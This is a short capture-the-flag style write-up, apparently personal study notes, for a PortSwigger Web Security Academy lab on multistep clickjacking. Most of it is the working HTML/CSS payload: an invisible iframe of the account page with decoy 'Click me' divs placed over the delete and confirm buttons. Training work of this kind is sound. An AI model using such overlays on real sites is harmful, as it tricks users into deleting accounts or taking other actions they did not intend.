### Lab: Multistep clickjacking
The goal of this lab is to trick a victim to delete her account, while performing another action on the decoy web site (the exploit website). This time I had to follow the provided solution since, honestly I did not know this vulnerability before, but hey, we are here to learn 😊.
<br>Following there is the payload I used, I had to adjust the <i>top and left</i> values for both the div to properly overlay the delete button and the confirmation button.<br>
```
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:215px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aa0009e039547a5c5c92d6400820028.web-security-academy.net/my-account"></iframe>
```
Reference: https://portswigger.net/web-security/clickjacking
